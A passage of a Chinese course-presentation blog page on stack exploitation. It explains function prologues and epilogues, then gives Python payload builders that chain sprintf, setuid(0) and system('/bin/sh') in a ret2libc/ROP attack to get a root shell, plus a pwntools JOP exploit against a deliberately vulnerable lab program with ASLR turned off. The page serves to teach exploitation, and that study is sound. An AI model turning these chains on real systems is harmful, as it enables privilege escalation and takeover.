+<h3 id="函数的序言和后记"><a href="#函数的序言和后记" class="headerlink" title="函数的序言和后记"></a>函数的序言和后记</h3><p>对于 32 位程序，函数序言用于为函数准备栈和指针，通常会包含以下 3 条指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pushl %ebp   	; 保存 ebp 值（它目前指向调用者栈帧）</span><br><span class="line">movl %esp %ebp 	; 让 ebp 指向被调用者的栈帧</span><br><span class="line">subl $N %esp  	; 为局部变量预留空间</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109150443688.png" alt="image-20221109150443688"></p>
+<p>函数后记用于恢复栈和寄存器到函数调用以前的状态，通常包含以下 3 条指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl %ebp %esp 	; 释放为局部变量开辟的栈空间</span><br><span class="line">popl %ebp 		; 让 ebp 指回调用者函数的栈帧</span><br><span class="line">ret  			; 返回</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109151033473.png" alt="image-20221109151033473"></p>
+<h3 id="链式调用没有参数的函数"><a href="#链式调用没有参数的函数" class="headerlink" title="链式调用没有参数的函数"></a>链式调用没有参数的函数</h3><p>下面考虑从 foo 函数调用 F 函数，我们假设初始时 ebp&#x3D;X，那么执行 mov 之后 esp&#x3D;X，执行 pop 时 ebp 得到 esp 地址存储的值，也就是 *X，esp&#x3D;X+4；再执行 ret 时 esp 继续加 4 变成 X+8。执行 push ebp 时，esp 需要减 4 变成 X+4；执行 mov esp ebp 时 ebp&#x3D;esp&#x3D;X+4，也就是 ebp 的值每次都会增加 4。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109154136084.png" alt="image-20221109154136084"></p>
+<p>我们希望 foo 调用 bar1，那么就把 bar1 的地址放在 foo 的 ebp + 4 的位置，希望 bar1 调用 bar2，那么就把 bar2 的地址放在 bar1 的 ebp + 4 的位置，而 bar1 的 ebp 是 foo 的 ebp + 4，那么就把 bar2 放在 foo 的 ebp + 8 的位置。以此类推…</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="comment">/* print out information for experiment purpose */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer[] inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer value inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)framep);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function foo() is invoked %d times\n&quot;</span>, i++);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于上面这个有缓冲区溢出漏洞的 foo，我们希望能够调用 bar 函数 10 次，那么可以这样构造我们的输入：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 gdb 得到位置</span></span><br><span class="line">bar_addr = <span class="number">0x565562d0</span></span><br><span class="line">exit_addr = <span class="number">0xf7e00ec0</span></span><br><span class="line"></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>)) <span class="comment"># $ebp - &amp;buffer</span></span><br><span class="line">content += tobytes(<span class="number">0xffffffff</span>) <span class="comment"># ebp 的值，不重要</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    content += tobytes(bar_addr)</span><br><span class="line">content += tobytes(exit_addr)</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109161115660.png" alt="image-20221109161115660"></p>
+<h3 id="链式调用有参数的函数（跳过序言）"><a href="#链式调用有参数的函数（跳过序言）" class="headerlink" title="链式调用有参数的函数（跳过序言）"></a>链式调用有参数的函数（跳过序言）</h3><p>对于调用有参数的函数，ebp + 8 之类的位置需要放参数，不能链式的放函数的地址了。</p>
+<p>解决办法就是我们不让被调用函数的序言执行，那么 ebp 就会变成 Y，也就是之前 *ebp 的值，而这个值我们是可以改变的，我们可以设置这个值为 ebp + 0x20，那么就是 ebp 每次增加 0x20 而不是 4 了，这样就有足够的空间让我们填入参数了。</p>
+<p>为了跳过函数序言，我们可以不跳转到函数，而是选择跳转到函数序言后面的指令：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109162037679.png" alt="image-20221109162037679"></p>
+<p>我们就这样这样构造输入：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exit_addr = <span class="number">0xf7e00ec0</span></span><br><span class="line">baz_addr = <span class="number">0x56556316</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc9f8</span></span><br><span class="line"></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    ebp_next += <span class="number">0x20</span> </span><br><span class="line">    content += tobytes(ebp_next) <span class="comment"># 让 ebp 位置的值增加 0x20</span></span><br><span class="line">    content += tobytes(baz_addr) <span class="comment"># 然后 4 个字节是需要调用的函数</span></span><br><span class="line">    content += tobytes(<span class="number">0xaabbccdd</span>) <span class="comment"># 然后是函数参数</span></span><br><span class="line">    content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">12</span>) <span class="comment"># 填充 0x20 字节中没用完的</span></span><br><span class="line"><span class="comment"># 调用 exit，可以不要</span></span><br><span class="line">content += tobytes(<span class="number">0xffffffff</span>)</span><br><span class="line">content += tobytes(exit_addr)</span><br><span class="line">content += tobytes(<span class="number">0xaabbccdd</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108234902510.png" alt="image-20221108234902510"></p>
+<h3 id="链式调用有参数的函数（跳过后记）"><a href="#链式调用有参数的函数（跳过后记）" class="headerlink" title="链式调用有参数的函数（跳过后记）"></a>链式调用有参数的函数（跳过后记）</h3><p>现在，库函数都是通过过程链接表（PLT）调用的，即我们不直接跳转到这些函数的入口点；我们需要跳转到 PLT 中的一个入口，它执行连接目标库函数并最终跳转到其入口点的重要步骤。这种机制广泛用于调用动态链接库。因此，如果我们想跳过函数序言，我们必须跳过 PLT 内部所有的中间设置指令，但没有设置，是不可能调用目标函数的。</p>
+<p>为了实现跳过后记，我们引入一个 empty() 函数，顾名思义，这是一个空函数。当需要从 A() 函数跳转 B 函数时，我们先从 A() 函数跳转到 empty() 函数，并跳过 empty() 函数的序言（相对于只执行了后记），然后从 empty() 函数跳转到 B() 函数。</p>
+<p>从 A() 函数跳转到 empty() 函数跳过序言，ebp 的值从 X 变成 Y，从 empty() 函数跳转到 B() 函数，值会增加 4，那么就是变成 Y + 4。empty() 函数去掉序言，只剩下后记，那么其实就是相当于 A() 函数的后记执行两遍。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109181549899.png" alt="image-20221109181549899"></p>
+<p>这样，我们就可以调用库函数了：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># From foo () to the first function</span></span><br><span class="line">ebp_next = ebp_foo + <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(leaveret) <span class="comment"># 调用 leaveret ，没有函数序言，ebp 从 X 变成 Y，增加 20</span></span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="comment"># 空函数跳转执行 printf，ebp 增加 4，因此可以链式执行后面的 leaveret 函数</span></span><br><span class="line">    ebp_next += <span class="number">0x20</span></span><br><span class="line">    content += tobytes(ebp_next)</span><br><span class="line">    content += tobytes(printf_addr)</span><br><span class="line">    content += tobytes(leaveret)</span><br><span class="line">    content += tobytes(sh_addr)</span><br><span class="line">    content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 空函数再次跳转到 exit</span></span><br><span class="line">content += tobytes(<span class="number">0xffffffff</span>)</span><br><span class="line">content += tobytes(exit_addr)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109104213067.png" alt="image-20221109104213067"></p>
+<h3 id="攻击程序"><a href="#攻击程序" class="headerlink" title="攻击程序"></a>攻击程序</h3><p>有了上面的基础，就可以构造我们的攻击函数了，我们需要调用 setuid(0) 之后调用 system(“&#x2F;bin&#x2F;sh”)，但是 setuid(0) 的 0 不能通过字符串传进去（strcpy 遇到 \0 就会终止，而 0 是由 4 个 \0 组成的）。因此，我们可以调用 sprintf(char *a, char *b) 将 b 拷贝到 a，单个的 \0 可以从参数 &#x2F;bin&#x2F;sh 的末尾拿到。（这个参数是通过环境变量写进去的）。重复执行 sprintf 四次，就可以得到一个 0。</p>
+<p>因此，完整的函数调用链是 bof -&gt; sprintf -&gt; sprintf -&gt; sprintf -&gt; sprintf -&gt; setuid -&gt; system -&gt; exit，构造输入如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">sprintf_arg1 = ebp_foo + <span class="number">12</span> + <span class="number">5</span> * <span class="number">0x20</span> <span class="comment"># setuid 参数的地址</span></span><br><span class="line">sprintf_arg2 = sh_addr + <span class="built_in">len</span>(<span class="string">&quot;/bin/sh&quot;</span>) <span class="comment"># \0 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># From foo () to the first function</span></span><br><span class="line">ebp_next = ebp_foo + <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sprintf</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ebp_next += <span class="number">0x20</span></span><br><span class="line">    content += tobytes(ebp_next)</span><br><span class="line">    content += tobytes(sprintf_addr)</span><br><span class="line">    content += tobytes(leaveret)</span><br><span class="line">    content += tobytes(sprintf_arg1)</span><br><span class="line">    content += tobytes(sprintf_arg2)</span><br><span class="line">    content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">20</span>)</span><br><span class="line">    sprintf_arg1 += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># setuid(0)</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(setuid_addr)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += tobytes(<span class="number">0xffffffff</span>)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(system_addr)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += tobytes(sh_addr)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xffffffff</span>)</span><br><span class="line">content += tobytes(exit_addr)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下，成功把 uid 也设为了 0：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109184334028.png" alt="image-20221109184334028"></p>
+<h2 id="JOP"><a href="#JOP" class="headerlink" title="JOP"></a>JOP</h2><p>JOP 全称为 Return-oriented Programming（面向跳转的编程），是代码重用攻击方式的一种。实际上是在代码空间中寻找被称为 gadget 的一连串目标指令，且其以 jmp 结尾。和 ROP 不同之处在于，ROP 在函数返回时才调用另一个函数，JOP 在代码段有 jmp 指令时就可以跳转另一个代码段。</p>
+<p>当程序在执行间接跳转或者是间接调用指令时，程序将从指定寄存器中获得其跳转的目的地址，由于这些跳转目的地址保存在寄存器中，而攻击者可以修改栈内容来修改寄存器内容，使得程序中间接跳转和间接调用目的地址能够被攻击者篡改。</p>
+<p>当攻击者篡改寄存器内容时，攻击者就可以让程序跳转到攻击者所构建的 gadget 地址处，执行JOP攻击。</p>
+<h3 id="攻击案例"><a href="#攻击案例" class="headerlink" title="攻击案例"></a>攻击案例</h3><p>关闭地址随机化，安装两个 python 包</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">sudo -H python3 -m pip install ROPgadget</span><br><span class="line">sudo pip install pwn</span><br></pre></td></tr></table></figure>
+
+<p>编写含有漏洞的程序并编译：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Normal return\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -fno-stack-protector -o attack attack.c -ldl</span></span><br></pre></td></tr></table></figure>
+
+<p>查看程序使用的动态连接库：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109201430419.png" alt="image-20221109201430419"></p>
+<p>调用 ROPgadget 得到下面这个两条指令的地址：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109201300490.png" alt="image-20221109201300490"></p>
+<p>构造 payload ：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">proc = process(<span class="string">&quot;./attack&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x7ffff7e17290</span></span><br><span class="line">arg_addr = <span class="number">0x7fffffffefe7</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000036174</span> - libc.symbols[<span class="string">&#x27;system&#x27;</span>] + sys_addr</span><br><span class="line">jmp_addr = <span class="number">0x00000000000346fd</span> - libc.symbols[<span class="string">&#x27;system&#x27;</span>] + sys_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">18</span> + p64(ret_addr) + p64(sys_addr) + p64(jmp_addr) + p64(arg_addr)</span><br><span class="line"></span><br><span class="line">proc.send(payload)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>执行攻击：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109204254368.png" alt="image-20221109204254368"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">基本原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%A0%86%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">函数堆栈的结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode"><span class="toc-number">1.2.2.</span> <span class="toc-text">shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.3.</span> <span class="toc-text">一个缓冲区溢出的实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">被攻击的程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%BE%97%E5%88%B0%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">调试程序得到一些有用的数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%86-shellcode-%E6%8F%92%E5%85%A5%E5%90%88%E9%80%82%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.3.</span> <span class="toc-text">构造字符串将 shellcode 插入合适位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BB%93%E6%9E%9C"><span class="toc-number">1.3.4.</span> <span class="toc-text">执行程序的结果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#return-to-libc"><span class="toc-number">2.</span> <span class="toc-text">return to libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">2.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E8%B0%83%E7%94%A8-system-%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">得到调用 system 函数的参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%96%BD%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.</span> <span class="toc-text">实施攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">3.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">3.1.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%8F%E8%A8%80%E5%92%8C%E5%90%8E%E8%AE%B0"><span class="toc-number">3.2.</span> <span class="toc-text">函数的序言和后记</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E6%B2%A1%E6%9C%89%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">链式调用没有参数的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E6%9C%89%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%88%E8%B7%B3%E8%BF%87%E5%BA%8F%E8%A8%80%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">链式调用有参数的函数（跳过序言）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E6%9C%89%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%88%E8%B7%B3%E8%BF%87%E5%90%8E%E8%AE%B0%EF%BC%89"><span class="toc-number">3.5.</span> <span class="toc-text">链式调用有参数的函数（跳过后记）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.6.</span> <span class="toc-text">攻击程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JOP"><span class="toc-number">4.</span> <span class="toc-text">JOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B"><span class="toc-number">4.1.</span> <span class="toc-text">攻击案例</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/354eb348.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/354eb348.html&text=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/354eb348.html&is_video=false&description=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP&body=Check out this article: https://ceyewan.github.io/p/354eb348.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/354eb348.html&title=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/354eb348.html&name=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/354eb348.html&t=Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
